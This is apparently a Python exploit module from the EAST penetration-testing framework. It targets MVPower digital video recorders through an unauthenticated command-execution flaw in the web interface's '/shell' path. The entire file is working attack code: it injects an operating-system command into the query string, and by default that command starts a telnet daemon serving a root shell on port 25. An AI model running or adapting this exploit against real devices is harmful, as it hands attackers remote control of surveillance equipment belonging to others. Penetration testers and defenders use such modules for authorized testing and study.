#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib
import urllib2
import base64
from time import sleep

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_mvpower_dvr_rce"
INFO['DESCRIPTION'] = "MVPower DVR Shell Unauthenticated Command Execution Exploit"
INFO['VENDOR'] = ""
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://0day.today/exploit/27128', 'https://www.pentestpartners.com/blog/pwning-cctv-cameras/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Module exploits an unauthenticated remote command execution vulnerability in MVPower digital video recorders. The 'shell' file on the web interface executes arbitrary operating system commands in the query string.
This module was tested successfully on a MVPower model TV-7104HE with firmware version 1.8.4 115215B9 (Build 2014/11/17)."""

INFO['CHANGELOG'] = "27 Feb, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["COMMAND"] = '/usr/sbin/telnetd -l/bin/sh -p 25', dict(description = 'Command')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.command = ""
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.command = self.args.get('COMMAND', self.command)
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        
        payload = urllib.quote(self.command)
        self.log('Sending packet ...')
        try:
            fd = urllib2.urlopen(self.make_url('/shell?{}'.format(payload)))
            self.log(fd.read())
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()

